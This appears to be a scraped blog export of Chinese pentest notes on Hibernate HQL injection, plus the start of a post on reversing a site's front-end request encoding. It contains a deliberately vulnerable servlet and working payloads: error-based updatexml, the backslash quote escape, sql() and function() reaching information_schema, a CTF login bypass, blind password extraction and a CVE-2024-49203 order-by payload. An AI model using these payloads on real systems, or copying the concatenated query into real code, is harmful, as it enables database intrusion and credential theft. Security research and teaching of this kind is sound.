","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:1:2","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"3、基础示例代码 示例数据库： mysql\u003e select * from users; +------+------+------------------+ | id | name | email | +------+------+------------------+ | 1 | test | test@example.com | +------+------+------------------+ 1 row in set (0.01 sec) 1）新建Maven项目 打开IDE，选择新建Maven项目。 在pom.xml中添加Hibernate和数据库驱动的依赖： \u003cdependencies\u003e \u003c!-- Hibernate Core --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.hibernate\u003c/groupId\u003e \u003cartifactId\u003ehibernate-core\u003c/artifactId\u003e \u003cversion\u003e5.6.15.Final\u003c/version\u003e \u003c/dependency\u003e \u003c!-- MySQL Connector --\u003e \u003cdependency\u003e \u003cgroupId\u003emysql\u003c/groupId\u003e \u003cartifactId\u003emysql-connector-java\u003c/artifactId\u003e \u003cversion\u003e8.0.33\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e 2）配置Hibernate文件 hibernate配置xml文件包含与数据库连接相关的属性和映射类 在src/main/resources目录下创建hibernate.cfg.xml文件，配置数据库连接和Hibernate属性： \u003chibernate-configuration\u003e \u003csession-factory\u003e \u003c!-- Database connection settings --\u003e \u003cproperty name=\"hibernate.connection.driver_class\"\u003ecom.mysql.cj.jdbc.Driver\u003c/property\u003e \u003cproperty name=\"hibernate.connection.url\"\u003ejdbc:mysql://localhost:3306/testdb\u003c/property\u003e \u003cproperty name=\"hibernate.connection.username\"\u003eroot\u003c/property\u003e \u003cproperty name=\"hibernate.connection.password\"\u003epassword\u003c/property\u003e \u003c!-- SQL dialect --\u003e \u003cproperty name=\"hibernate.dialect\"\u003eorg.hibernate.dialect.MySQL8Dialect\u003c/property\u003e \u003c!-- Echo all executed SQL to stdout --\u003e \u003cproperty name=\"hibernate.show_sql\"\u003etrue\u003c/property\u003e \u003cproperty name=\"hibernate.format_sql\"\u003etrue\u003c/property\u003e \u003c!-- Drop and re-create the database schema on startup --\u003e \u003cproperty name=\"hibernate.hbm2ddl.auto\"\u003eupdate\u003c/property\u003e \u003c/session-factory\u003e \u003c/hibernate-configuration\u003e 确保数据库testdb已创建，用户名密码配置正确。 启用hibernate.show_sql可以查看经过HQL引擎处理后生成的SQL语句，启用hibernate.format_sql可以使输出的SQL语句更可读。 在这个配置文件中，还可以显式声明实体类，写法为： \u003cmapping class=\"com.example.User\"/\u003e 3）创建模型类 创建一个Java类作为模型类，将数据库表映射为相关的类。 新建了一个User类，对应users表，声明其中相对应的列名 import javax.persistence.*; @Entity @Table(name = \"users\") public class User { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private int id; @Column(name = \"name\") private String name; @Column(name = \"email\") private String email; // Getter and Setter for id public int getId() { return id; } public void setId(int id) { this.id = id; } // Getter and Setter for name public String getName() { return name; } public void setName(String name) { this.name = name; } // Getter and Setter for email public String getEmail() { return email; } public void setEmail(String email) { this.email = email; } // Optional: Override toString() for better logging @Override public String toString() { return \"User{\" + \"id=\" + id + \", name='\" + name + '\\'' + \", email='\" + email + '\\'' + '}'; } } 使用注解将类映射到数据库表。 4）SessionFactory类 创建工具类HibernateUtil以管理Session： import org.hibernate.SessionFactory; import org.hibernate.cfg.Configuration; public class HibernateUtil { private static final SessionFactory sessionFactory = buildSessionFactory(); private static SessionFactory buildSessionFactory() { try { return new Configuration().configure().buildSessionFactory(); } catch (Throwable ex) { throw new ExceptionInInitializerError(ex); } } public static SessionFactory getSessionFactory() { return sessionFactory; } } 5）使用HQL查询 在Main类中编写查询代码： import org.hibernate.Session; import org.hibernate.query.Query; public class Main { public static void main(String[] args) { Session session = HibernateUtil.getSessionFactory().openSession(); session.beginTransaction(); // HQL查询示例 Query\u003cUser\u003e query = session.createQuery(\"FROM User WHERE email = :email\", User.class); query.setParameter(\"email\", \"test@example.com\"); User user = query.uniqueResult(); System.out.println(\"User: \" + user.getName()); session.getTransaction().commit(); session.close(); } } 上图是配置文件中没加\u003cproperty name=\"hibernate.format_sql\"\u003etrue\u003c/property\u003e 时的输出，懒得改了 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:1:3","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"4、Web示例代码 基于上述代码，将其改为Web服务 文件目录： src/main/ ├── java/ │ └── com/example/ │ ├── User.java │ ├── HibernateUtil.java │ └── UserServlet.java ├── resources/ │ └── hibernate.cfg.xml └── webapp/ └── WEB-INF/ └── web.xml UserServlet类 package com.example; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; import org.hibernate.Session; import org.hibernate.query.Query; @WebServlet(\"/user\") public class UserServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.setContentType(\"text/plain\"); PrintWriter out = resp.getWriter(); String parameter = req.getParameter(\"name\"); if (parameter == null || parameter.isEmpty()) { out.println(\"Error: 'name' parameter is required.\"); return; } Session session = HibernateUtil.getSessionFactory().openSession(); session.beginTransaction(); try { out.print(\"Hibernate Version: 5.6.15.Final\\n\\n\"); // Query\u003cUser\u003e query = session.createQuery(\"FROM User WHERE name = :parameter\", User.class); // query.setParameter(\"name\", parameter); Query\u003cUser\u003e query = session.createQuery(\"from User where name='\"+ parameter +\"'\", User.class); User user = query.uniqueResult(); if (user != null) { out.println(\"com.example.User found: \" + user.getName() + \", Email: \" + user.getEmail()); } else { out.println(\"No user found with name: \" + parameter); } session.getTransaction().commit(); // } catch (Exception e) { // if (session.getTransaction() != null) { // session.getTransaction().rollback(); // } // out.println(\"Error: \" + e.getMessage()); } finally { session.close(); } } } 注意在测试报错注入时，建议把 catch 部分代码注释。 user类 package com.example; import javax.persistence.*; @Entity @Table(name = \"users\") public class User { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private int id; @Column(name = \"name\") private String name; @Column(name = \"email\") private String email; // Getters and Setters public int getId() { return id; } public void setId(int id) { this.id = id; } public String getName() { return name; } public void setName(String name) { this.name = name; } public String getEmail() { return email; } public void setEmail(String email) { this.email = email; } } HibernateUtil类 package com.example; import org.hibernate.SessionFactory; import org.hibernate.cfg.Configuration; public class HibernateUtil { private static final SessionFactory sessionFactory = buildSessionFactory(); private static SessionFactory buildSessionFactory() { try { return new Configuration().configure().buildSessionFactory(); } catch (Throwable ex) { throw new ExceptionInInitializerError(ex); } } public static SessionFactory getSessionFactory() { return sessionFactory; } } hibernate.cfg.xml配置文件 \u003chibernate-configuration\u003e \u003csession-factory\u003e \u003c!-- Database connection settings --\u003e \u003cproperty name=\"hibernate.connection.driver_class\"\u003ecom.mysql.cj.jdbc.Driver\u003c/property\u003e \u003cproperty name=\"hibernate.connection.url\"\u003ejdbc:mysql://localhost:3306/test\u003c/property\u003e \u003cproperty name=\"hibernate.connection.username\"\u003eroot\u003c/property\u003e \u003cproperty name=\"hibernate.connection.password\"\u003epassword\u003c/property\u003e \u003c!-- SQL dialect --\u003e \u003cproperty name=\"hibernate.dialect\"\u003eorg.hibernate.dialect.MySQL8Dialect\u003c/property\u003e \u003c!-- Echo all executed SQL to stdout --\u003e \u003cproperty name=\"hibernate.show_sql\"\u003etrue\u003c/property\u003e \u003cproperty name=\"hibernate.format_sql\"\u003etrue\u003c/property\u003e \u003c!-- Drop and re-create the database schema on startup --\u003e \u003cproperty name=\"hibernate.hbm2ddl.auto\"\u003eupdate\u003c/property\u003e \u003c!-- 显式声明实体类 --\u003e \u003cmapping class=\"com.example.User\"/\u003e \u003c/session-factory\u003e \u003c/hibernate-configuration\u003e web.xml \u003cweb-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\" ver","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:1:4","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"HQL语句注入 HQL注入就是利用Hibernate框架产生的注入点，Hibernate 中没有对数据进行有效的验证导致恶意数据进入应用程序中造成的。 按照查询方式不同也分为两种注入：原生SQL语句注入 和 HQL语句注入 原生SQL语句注入 String parameter = req.getParameter(\"name\"); Query query = session.createSQLQuery(\"SELECT table_name FROM information_schema.tables where table_schema='\"+parameter+\"'\"); 这种因为使用的数据库原生的语句，使用对应数据库SQL语句进行拼接注入即可，无任何限制，这里不做讨论。 在Hibernate 5.2.5.Final 版本中createSQLQuery被弃用了 HQL语句注入 String parameter = req.getParameter(\"name\"); Query\u003cUser\u003e query = session.createQuery(\"from User where name='\"+ parameter +\"'\", User.class); HQL语句执行逻辑： Hibernate框架首先会去解析createQuery()函数中语句是否符合HQL语法，不符合则会触发HQL语法错误； 符合HQL语法后，HQL框架引擎会将其解析成对应数据库的原生SQL语句； 将原生SQL语句去数据库中进行查询获取结果，此时原生SQL语句如果不正确则会导致数据库层面的报错（不同数据库则是不同的报错了） 图中上面是HQL语法的语句、下面则是HQL引擎转换的mysql数据库的SQL语句。 因此上述过程会有两种错误消息来源，一种来自hibernate引擎，一种来自后端数据库。 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:2:0","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"判断注入点 可以通过插入特殊字符方式，尝试触发上述两种报错。 ' () 特殊字符/Unicode 如果出现 org.hibernate.exception 报错，则后端使用了 hibernate 框架。 HQL注入 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:2:1","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"HQL基础注入 基础注入方式就是猜测表名、列名去查询数据，这部分主要依靠字典的能力 1、如果有报错信息的话，那就根据报错回显去看表名、列名，根据表名进行盲注或报错注入查询数据。或者根据回显去猜测可能存在的表名和列名，然后进行查询数据 2、如果没有报错信息的话 使用and或or进行列名的枚举 ?name=mysql' or xxxxx = '1 使用子查询进行表名枚举 ?name=mysql'or+(select+1+from+XXXX+where+1=2)='1 主要还是拼的字典的好坏。 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:2:2","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"HQL注入限制 HQL注入的一大挑战是注入模式非常有限，其没有联合语句，没有函数来创建简单延迟，没有系统函数，没有可用的元数据表等。 Hibernate查询语言没有那些在后台数据库中可能存在的功能特性。 用具体案例看一下 1、正常查询 ?name=test ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:3:0","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"union限制 union查询在5.6.15版本及其之前不支持 name=test' union select 1,2,'3 #报错 6.x版本开始支持union查询，但是也只能利用HQL语法 name=mysql' union from User where '1'='1 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:3:1","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"注释限制 多行注释/**/，在5.6.15版本之前不支持，在6.0.1开始支持多行注释 ?name=test'+and/**/'1'='1 #5.6.15报错 不能使用单行注释#或+--+ ?name=test'+and+'1'='1'+--+ #报错 ?name=test'+and+'1'='1'%23 #报错 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:3:2","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"子查询限制 可以使用子查询，但必须是HQL已经映射的表和字段 ?name=test' and (select name from User where id=1)='test 未映射的表不能查询 name=test' and (select id from test1 where id=1)='1 #报错 未映射的字段名不能查询 name=test' and (select newname from User where id=1)='1 #报错 映射后表名、列名大小写敏感，也会报错 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:3:3","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"通配符*限制 不支持*查询 ?name=test' and (select * from User where id=1)='1 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:3:4","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"HQL注入进阶 因为HQL框架不管你HQL语句是什么，最终还是要转为SQL语句在数据库中进行查询的。 下面主要以MYSQL数据库进行研究，当然不同版本HQL逃逸方式是不同的。 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:4:0","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"数据库函数 Hibernate会在 SELECT 和 WHERE 语句中隐藏一些不可识别的列名，对函数也一样。 1、在 5.6.15之前，WHERE子句中是可以使用用户自定义函数的，这就说明数据库本身的函数也是可以使用的 调用数据库函数的标准过程是 事先注册函数映射（HQL-\u003eSQL）（Java代码），但攻击者不需要关心兼容性。 updatexml() version() user() database() ?name=test' and updatexml(1,concat('~',version(),'~'),1)='1 这块报错把代码中的 catch部分代码注释后才会显示。 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:4:1","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"单引号转义 低于5.x版本逃逸 在5.6.15版本之前，存在着对HQL与SQL单引号转义的差异导致的逃逸问题 在HQL语言，字符串和常规SQL语句一样都是使用单引号包裹 from User where name = 'test' 引擎是不会对字符串里面的内容进行解析的，当在字符串中加入一个转义字符 from Tables where name = 'test\\' HQL引擎是不识别转义字符\\的，它会将test\\作为一个字符串整体，原封不动的转为mysql语句 此处就导致了一个差异，mysql是识别转译字符的，所以爆了语法错误 然后利用这个差异，构造一个HQL以为是字符串，但转为mysql变成语句的POC即可 test\\''and 1=2 union select 1,user(),version()# 拼接HQL语句，此时HQL引擎会将其视为一整个字符串，所以引擎不去解析 from User where name = 'test\\''and 1=2 union select 1,user(),version()#' 最后转为SQL语句，逃逸成功执行union语句 从6.0.1.Final版本开始，测试发现转义符\\失效 'mysql\\a' =\u003e 'mysql\\\\a' 'mysql\\' =\u003e 'mysql\\\\' 'mysql\\'' =\u003e 'mysql''' 'mysql\\''' =\u003e 'mysql''''' 从6.1.7.Final版本开始又有了变化 'mysql\\a' =\u003e 'mysql\\\\a' 'mysql\\' =\u003e 'mysql\\\\' 'mysql\\'' =\u003e 'mysql\\\\'' 'mysql\\''' =\u003e 'mysql\\\\''' 'mysql\\\\' =\u003e 'mysql\\\\\\\\' 所以无法使用此方式逃逸了 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:4:2","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"sql() 这部分我没进行验证，没有记录 高于6.x 版本逃逸 在6.x版本中发现新增了一个sql()函数，在5.x版本是不支持的 https://docs.jboss.org/hibernate/orm/6.0/userguide/html_single/Hibernate_User_Guide.html#hql-function-sql 意思就是可以执行SQL语句，主要是两种方式 sql('select 1,2,3') sql('select 1,2,?','3') 1、第一种是将函数里面的字符串直接拼接SQL语句中，然后去执行 2、第二种就是将后面参数预编译替换占位符?，然后再拼接到SQL语句中执行 既然是以字符串拼接的方式进行解析，那就能构造出poc进行利用 ?name=mysql' and sql('1=2 union select table_name,table_schema from information_schema.tables#')='1 下面是最终解析完的sql语句，成功逃逸 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:4:3","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"function() Hibernate框架同时支持JPQL语言和HQL语言的，可利用JPQL语言的function()函数进行注入 https://docs.jboss.org/hibernate/orm/5.6/userguide/html_single/Hibernate_User_Guide.html#hql-user-defined-functions-where-clause function()函数是用来调用自定义函数或数据库自带函数的，和某些动态函数调用差不多吧 function('version') =\u003e version() function('updatexml',1,1,1) =\u003e updatexml(1,1,1) function('aaaa''bbbb',1,1,1) =\u003e aaaa''bbbb(1,1,1) 5.x版本 function('aaaa''bbbb',1,1,1) =\u003e aaaa'bbbb(1,1,1) 6.x版本 第一参数作为函数名，随后拼接一个括号，后面的参数则是括号里的内容 而function()函数的利用和sql()函数一样，是直接拼接在解析后的SQL语句中的，而且第一参数的内容没有任何限制 这样就可以构造一个可利用POC了 ?name=test' and function('1=2 union select 1,table_name,table_schema from information_schema.tables#')=' 这里注意function函数会在后面添加一对括号，可以使用单行注释进行注释 通过function()方法，可以对任意表进行读取。 报错注入： name=test' and FUNCTION('updatexml',1,concat('~',user(),'~'),1)= ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:4:4","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"HQL注入防御 HQL参数名称绑定 防御sql注入最好的办法就是预编译 Query query=session.createQuery(“from User user where user.name=:customername and user:customerage=:age ”); query.setString(“customername”,name); query.setInteger(“customerage”,age); HQL参数位置邦定： Query query=session.createQuery(“from User user where user.name=? and user.age =? ”); query.setString(0,name); query.setInteger(1,age); setParameter() String hql=”from User user where user.name=:customername ”; Query query=session.createQuery(hql); query.setParameter(“customername”,name,Hibernate.STRING); setProperties()方法： setProperties()方法将命名参数与一个对象的属性值绑定在一起 Customer customer=new Customer(); customer.setName(“pansl”); customer.setAge(80); Query query=session.createQuery(“from Customer c where c.name=:name and c.age=:age ”); query.setProperties(customer); setProperties()方法会自动将customer对象实例的属性值匹配到命名参数上，但是要求命名参数名称必须要与实体对象相应的属性同名。 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:5:0","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"案例1-登录绕过 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:6:0","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"where语句注入 SCTF2018 : Zhuanxv这道题中 反编译后class看到hql语句 前面审计出条件：用户名过滤空格与等号 所以注入语句用换行符 %0a payload: admin%27%0Aor%0A%271%27%3E%270'%0Aor%0Aname%0Alike%0A'admin\u0026user.password=1 拼接后的语句： from User where name = 'admin' or '1'\u003e'0' or name like 'admin\u0026user.password=1' and password = 'password' 实现登录绕过 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:6:1","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"like语句注入 还有一种是like语句百分号里注入 大同小异: session.createQuery(\"from Book where title like '%\" + userInput + \"%' and published = true\") Payload : userInput 为 ' or 1=1 or ''=' 列出所有条目 from Bookwhere title like '%' or 1=1 or ''='%' and published = true 爆出隐藏的列: from Bookwhere title like '%' and promoCode like 'A%' or 1=2 and ''='%' and published = true from Bookwhere title like '%' and promoCode like 'B%' or 1=2 and ''='%' and published = true 列出所有的列 利用返回错误异常消息 列名不是Hibernate中实体定义的一部分，则其会触发异常 from Bookwhere title like '%' and DOESNT_EXIST=1 and ''='%' and published = true 触发异常： org.hibernate.exception.SQLGrammarException: Column \"DOESNT_EXIST\" not found; SQL statement:select book0_.id as id21_, book0_.author as author21_, book0_.promoCode as promo3_21_, book0_.title as title21_, book0_.published as published21_ from Book book0_ where book0_.title like '%' or DOESNT_EXIST='%' and book0_.published=1 [42122-159] 通过该异常，可以看到Hibernate查询的列表名。 盲注 如果查询不用的表，镶嵌使用子查询。 例如，以下查询会从表中选择一条与“User”实体关联的项 from Bookwhere title like '%' and (select substring(password,1,1) from User where username='admin') = 'a' or ''='%' and published = true 之后就可以按常规的盲注模式进行盲注了。 非盲注 from Bookwhere title like '%11' and (select password from User where username='admin')=1 or ''='%' and published = true Hibernate 将异常消息返回： Data conversion error converting \"3f3ff0cdbfa0d515f8e3751e4ed98abe\"; SQL statement:select book0_.id as id18_, book0_.author as author18_, book0_.promotionCode as promotio3_18_, book0_.title as title18_, book0_.visible as visible18_ from Book book0_ where book0_.title like '%11' and (select user1_.password from User user1_ where user1_.username = 'admin')=1 or ''='%' and book0_.published=1 [22018-159] 利用数据库函数 如：若数据库支持group_concat函数： from Bookwhere title like '%11' and (select cast(group_concat(password) as string) from User)=1 or ''='%' and published = true 则异常触发为： Data conversion error converting\"3f3ff0cdbfa0d515f8e3751e4ed98abe,79a41d71c31128ffab81ac8df2069f9c,b7fe6f6a1024db6e56027aeb558f9e68\";SQL statement: select book0_.id as id18_, book0_.author as author18_, book0_.promotionCodeas promotio3_18_, book0_.title as title18_, book0_.visible as visible18_ from Book book0_ where book0_.title like '%11' and (select cast(group_concat(user1_.password) as varchar(255)) from User user1_)=1 or ''='%' and book0_.published=1 [22018-159] ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:6:2","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"案例2-orderby ORM HQL Injection /view?sort=createdAt,date # 正常 /view?sort=createdAt,() # hql 报错 # Order by位置，注入点在联合查询的中间，需要平衡 /view?sort=createdAt,FUNCTION(CURRENT_INSTANT) CVE-2024-49203: Querydsl HQL orderby注入 # poc: https://github.com/CSIRTTrizna/CVE-2024-49203/ orderBy=name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:7:0","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"参考资料 Hibernate官方文档 HQL文档 Hibernate – Query Language HQL注入深入利用 HQL for pentesters https://ultramangaia.github.io/blog/2017/pwn2win-ctf-2017.html ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:8:0","tags":["SQLi","Java"],"title":"Hibernate框架HQL注入笔记","uri":"/posts/hibernate_hql_injection/"},{"categories":["案例分享"],"content":"记一次渗透测试中简单的前端加密案例","date":"2025-03-10","objectID":"/posts/002-case_simpleencryptioncase/","tags":["Pentest","Crypto"],"title":"002-渗透案例：记一次简单前端加密案例","uri":"/posts/002-case_simpleencryptioncase/"},{"categories":["案例分享"],"content":"前端JS分析 在一个项目上遇到的数据包加密，发现键值对都进行了加密使其不可读，数据包示例如下： POST /xxxxx/xxxxx HTTP/1.1 Host: xxxxxxxx %3DmQWUVmw6XZNckRdd5%3DWeEc=%3DlwrRUGR0T1PR1hNVR%3DTeEc\u0026%3D0wKWmltrGtbWFJdZh%3DYeEc=%3Dj3a3lWG9kTUQh0UTNIZMBMVeEc\u00263Vl95TkPVEoWeEc=%3D1Qsm0mywTTa6FUxJk0rwkFEPmGO61EpK0dTaJ5Vbl1WR9UMTRdWek5RRB1TN4dacR%3DTeEc\u0026%3DEQsG1VRST1PYpNdQh%3DZeEc=UVT9CVRPTEFVeEc 通过前端js分析后，发现使用的是 picList.encode(picList.encode2(param)) 仔细研究后发现，它跟 picList 其实关系不大，是开发者自己编写的一段js 对该前端代码进行分析，核心代码 jquery.picList.js 如下： var picList = { base64EncodeChars: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', base64DecodeChars: new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1), base64encode: function (r) { for (var e, a, t, o = r.length, h = 0, c = ''; h \u003c o;) { if (e = 255 \u0026 r.charCodeAt(h++), h == o) { c = (c += this.base64EncodeChars.charAt(e \u003e\u003e 2)) + this.base64EncodeChars.charAt((3 \u0026 e) \u003c\u003c 4) + '=='; break; } if (a = r.charCodeAt(h++), h == o) { c = (c = (c += this.base64EncodeChars.charAt(e \u003e\u003e 2)) + this.base64EncodeChars.charAt((3 \u0026 e) \u003c\u003c 4 | (240 \u0026 a) \u003e\u003e 4)) + this.base64EncodeChars.charAt((15 \u0026 a) \u003c\u003c 2) + '='; break; } t = r.charCodeAt(h++), c = (c = (c = (c += this.base64EncodeChars.charAt(e \u003e\u003e 2)) + this.base64EncodeChars.charAt((3 \u0026 e) \u003c\u003c 4 | (240 \u0026 a) \u003e\u003e 4)) + this.base64EncodeChars.charAt((15 \u0026 a) \u003c\u003c 2 | (192 \u0026 t) \u003e\u003e 6)) + this.base64EncodeChars.charAt(63 \u0026 t); } return c; }, base64decode: function (r) { for (var e, a, t, o, h = r.length, c = 0, s = ''; c \u003c h;) { for (; e = this.base64DecodeChars[255 \u0026 r.charCodeAt(c++)], c \u003c h \u0026\u0026 -1 == e;); if (-1 == e) break; for (; a = this.base64DecodeChars[255 \u0026 r.charCodeAt(c++)], c \u003c h \u0026\u0026 -1 == a;); if (-1 == a) break; s += String.fromCharCode(e \u003c\u003c 2 | (48 \u0026 a) \u003e\u003e 4); do { if (61 == (t = 255 \u0026 r.charCodeAt(c++))) return s; } while (t = this.base64DecodeChars[t], c \u003c h \u0026\u0026 -1 == t); if (-1 == t) break; s += String.fromCharCode((15 \u0026 a) \u003c\u003c 4 | (60 \u0026 t) \u003e\u003e 2); do { if (61 == (o = 255 \u0026 r.charCodeAt(c++))) return s; } while (o = this.base64DecodeChars[o], c \u003c h \u0026\u0026 -1 == o); if (-1 == o) break; s += String.fromCharCode((3 \u0026 t) \u003c\u003c 6 | o); } return s; }, utf16to8: function (r) { for (var e, a = '', t = r.length, o = 0; o \u003c t; o++) 1 \u003c= (e = r.charCodeAt(o)) \u0026\u0026 e \u003c= 127 ? a += r.charAt(o) : a = 2047 \u003c e ? (a = (a += String.fromCharCode(224 | e \u003e\u003e 12 \u0026 15)) + String.fromCharCode(128 | e \u003e\u003e 6 \u0026 63)) + String.fromCharCode(128 | e \u003e\u003e 0 \u0026 63) : (a += String.fromCharCode(192 | e \u003e\u003e 6 \u0026 31)) + String.fromCharCode(128 | e \u003e\u003e 0 \u0026 63); return a; }, utf8to16: function (r) { for (var e, a, t, o = '', h = r.length, c = 0; c \u003c h;) switch ((e = r.charCodeAt(c++)) \u003e\u003e 4) { case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7: o += r.charAt(c - 1); break; case 12: case 13: a = r.charCodeAt(c++), o += String.fromCharCode((31 \u0026 e) \u003c\u003c 6 | 63 \u0026 a); break; case 14: a = r.charCodeAt(c++), t = r.charCodeAt(c++), o += String.fromCharCode((15 \u0026 e) \u003c\u003c 12 | (63 \u0026 a) \u003c\u003c 6 | (63 \u0026 t) \u003c\u003c 0); } return o; }, randomStr: function (r) { for (var e = 'poiuytrewqasdfghjklmnbvcxzQWERTYUIOPLKJHGFDSAZXCVBNM123456789', a = '', t = 0; t \u003c r; t++) a += e.charAt(Math.ceil(100000000 * Math.random()) % e.length); return a; }, encode: function (r) { $.ECOND.picture \u0026\u0026 $.ECOND.picture, r += this.randomStr(5); for (var e, a = (str = picList.base64encode(picList.utf16to8(r))).split(''), t = 0; t \u003c Math.floor(a.length / 2); t++) t % 2 == 0 \u0026\u0026 (e = a[t], a[t] = a[a.length - 1 - t], a[a.length - 1 - t] = e); return $.ECOND.picture \u0026\u0026 '' != $.ECOND.picture ? a.join('') + 'cEe' : a.join('') + 'eEc'; }, encode2: fu","date":"2025-03-10","objectID":"/posts/002-case_simpleencryptioncase/:1:0","tags":["Pentest","Crypto"],"title":"002-渗透案例：记一次简单前端加密案例","uri":"/posts/002-case_simpleencryptioncase/"},{"categories":["案例分享"],"content":"Python脚本 分析完这个JS后，基于AI生成编写Python加解密脚本 import base64 import random import string from urllib.parse import quote, unquote def randomStr(length): letters = string.ascii_letters return ''.join(random.choice(letters) for i in range(length)) def utf16to8(s): return s.encode('utf-8') def utf8to16(s): return s.decode('utf-8') def base64encode(s): return base64.b64encode(s).decode('utf-8') def base64decode(s): return base64.b64decode(s) ECOND = { 'picture': None } def encode(r): # 给字符串 r 后面拼接随机5位字符串 r = r + randomStr(5) # 先将 r 转换为 UTF - 8 编码，再进行 Base64 编码 encoded_str = base64encode(utf16to8(r)) a = list(encoded_str) # 对编码后的字符串按字符拆分成数组，然后对数组的前半部分元素进行交换操作 for t in range(len(a) // 2): if t % 2 == 0: # 如果当前索引 t 是偶数，交换数组中索引为 t 和 len(a) - 1 - t 的元素 a[t], a[len(a) - 1 - t] = a[len(a) - 1 - t], a[t] # 根据 ECOND['picture'] 